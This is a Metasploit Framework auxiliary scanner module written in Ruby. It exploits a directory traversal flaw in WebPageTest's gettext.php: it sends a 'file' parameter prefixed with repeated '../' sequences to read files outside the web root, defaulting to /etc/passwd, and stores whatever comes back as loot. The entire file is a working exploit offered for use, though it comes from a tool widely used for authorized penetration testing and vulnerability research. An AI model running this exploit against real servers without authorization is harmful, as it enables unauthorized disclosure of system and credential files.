##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WebPageTest Directory Traversal',
			'Description'    => %q{
					This module exploits a directory traversal vulnerability found in WebPageTest.
				Due to the way the gettext.php script handles the 'file' parameter, it is possible
				to read a file outside the www directory.
			},
			'References'     =>
				[
					['EDB', '19790'],
					['OSVDB', '83817']
				],
			'Author'         =>
				[
					'dun',    #Discovery, PoC
					'sinn3r'  #Metasploit
				],
			'License'        => MSF_LICENSE,
			'DisclosureDate' => "Jul 13 2012"
		))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The base path to WebPageTest', '/www/']),
				OptString.new('FILE', [ true,  "The path to the file to view", '/etc/passwd']),
				OptInt.new('DEPTH', [true, 'The max traversal depth', 11])
			], self.class)

		deregister_options('RHOST')
	end


	def run_host(ip)
		file     = (datastore['FILE'][0,1] == '/') ? datastore['FILE'] : "/#{datastore['FILE']}"
		traverse = "../" * datastore['DEPTH']
		base     = File.dirname("#{target_uri.path}/.")

		print_status("Requesting: #{file} - #{rhost}")
		res = send_request_cgi({
			'uri'      => "#{base}/gettext.php",
			'vars_get' => { 'file' => "#{traverse}#{file}" }
		})

		if not res
			print_error("No response from server.")
			return
		end


		if res.code != 200
			print_error("Server returned a non-200 response (body will not be saved):")
			print_line(res.to_s)
			return
		end

		vprint_line(res.body)
		p = store_loot('webpagetest.traversal.file', 'application/octet-stream', ip, res.body, File.basename(file))
		print_good("File saved as: #{p}")
	end

end
